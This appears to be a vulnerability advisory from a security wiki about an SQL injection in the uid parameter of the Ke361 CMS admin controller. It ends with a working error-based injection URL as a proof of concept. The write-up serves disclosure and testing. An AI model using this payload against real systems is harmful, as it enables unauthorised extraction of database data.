# Ke361 AuthManagerController.class.php Background SQL injection vulnerability

## Vulnerability Description

Ke361 AuthManagerController.class.php uid parameter has SQL injection vulnerability, through which database sensitive information can be obtained

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Ke361</span>

## Environment construction

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">https://gitee.com/jcove/ke361</span>

## Vulnerability reappears

CMS Product Page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232823896.png)

The vulnerable file is `Application/Admin/Controller/AuthManagerController.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634142335709-0384ef5c-e05b-41af-b19d-a5b7864faaf3.png)

Verify POC

```php
/admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634142341220-a0120691-16d8-41e2-be07-abcaa561347f.png)